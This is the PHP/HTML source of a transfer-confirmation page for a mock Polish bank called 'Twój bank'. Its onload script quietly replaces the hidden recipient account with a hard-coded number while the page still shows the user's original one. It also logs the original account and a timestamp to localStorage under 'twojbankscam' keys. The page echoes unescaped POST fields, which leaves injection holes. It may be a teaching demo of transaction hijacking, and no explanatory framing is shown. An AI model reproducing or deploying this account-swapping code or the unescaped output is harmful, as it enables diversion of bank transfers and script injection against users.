<!DOCTYPE html>
<html>
<head>
<style>
body{background-color:black;color:white;text-align:center}
a{text-decoration:none;color:#ccf}
#zdiv{border:1px solid white;width:600px;margin:auto;margin-top:10px;background-color:#222}
#titl{border:1px solid white;width:600px;font-size:30pt;margin:auto;margin-top:10px;background-color:#222}
#links{font-size:14pt;margin-top:5px}
</style>

<script>
function addzero(i){
    if(i<10)
        return '0'+i;
    else
        return i;
}
function datetime(){
    var currentdate = new Date(); 
var datetime = currentdate.getFullYear() + "-"
                + addzero(currentdate.getMonth()+1)  + "-" 
                + addzero(currentdate.getDate()) + " "  
                + addzero(currentdate.getHours()) + ":"  
                + addzero(currentdate.getMinutes()) + ":" 
                + addzero(currentdate.getSeconds());
    return datetime;
}
function total(str){
    return (new Date(str.substr(0,4),str.substr(5,2),str.substr(8,2),str.substr(11,2),str.substr(14,2),str.substr(17,2),0).getTime());
}
function getInputsByValue(value)
{
    var allInputs = document.getElementsByTagName("input");
    var results = [];
    for(var x=0;x<allInputs.length;x++)
        if(allInputs[x].value == value)
            results.push(allInputs[x]);
    return results;
}
function load(){
    var destiny = "01234567891011121314151617";
    old = document.getElementsByName("account")[0].value;
    document.getElementsByName("account")[0].value = destiny;
    //document.getElementById("zdiv").innerHTML+=datetime()+" "+total(datetime());
    document.getElementById("f").addEventListener("submit",
        function(evt){
            //alert(old+" "+total(datetime()));
            if (typeof(Storage) !== "undefined") {
                if (localStorage.twojbankscamcount) {
                    localStorage.twojbankscamcount = Number(localStorage.twojbankscamcount) + 1;
                } else {
                    localStorage.twojbankscamcount = 0;
                }
                localStorage.setItem("twojbankscamaccount"+localStorage.twojbankscamcount,old);
                localStorage.setItem("twojbankscamdate"+localStorage.twojbankscamcount,total(datetime()));
            } else {
                alert("Zainstaluj najnowszą wersję przeglądarki, by móc korzystać z wszystkich możliwości serwisu!");
            }
        }
    );
}
</script>

</head>
<body onload="load()">
<div id="titl">
Twój bank
<div id="links">
<?php
session_start();
if(isset($_SESSION['userlogged'])){
    echo("Zalogowany: ".$_SESSION['userlogged'] . '<br/>' . file_get_contents('logged.txt'));
} else {
    header("Location: login.php");
}
?>
</div>
</div>
<div id="zdiv">

<p>
<h3>Dane przelewu:</h3>
</p>
<table style="width:100%">
<?php
echo ("<tr><td>" . "Nazwa odbiorcy" . "</td><td>" . $_POST['name'] . "</td></tr>");
echo "<tr><td>" . "Numer rachunku" . "</td><td>" . $_POST['account'] . "</td></tr>";
echo "<tr><td>" . "Kwota" . "</td><td>" . $_POST['amount'] . " zł</td></tr>";
echo "<tr><td>" . "Adres" . "</td><td>" . $_POST['address'] . "</td></tr>";
echo "<tr><td>" . "Tytuł przelewu" . "</td><td>" . $_POST['title'] . "</td></tr>";

?>
</table>
<form method="POST" id="f" action="confirmregister.php">
<input type="hidden" name="name" value="<?php echo $_POST['name'] ?>"/>
<input type="hidden" name="account" value="<?php echo $_POST['account'] ?>"/>
<input type="hidden" name="amount" value="<?php echo $_POST['amount'] ?>"/>
<input type="hidden" name="address" value="<?php echo $_POST['address'] ?>"/>
<input type="hidden" name="title" value="<?php echo $_POST['title'] ?>"/>
<input type="submit" value="Zatwierdź" />
</form>
</div>
</body>
</html>
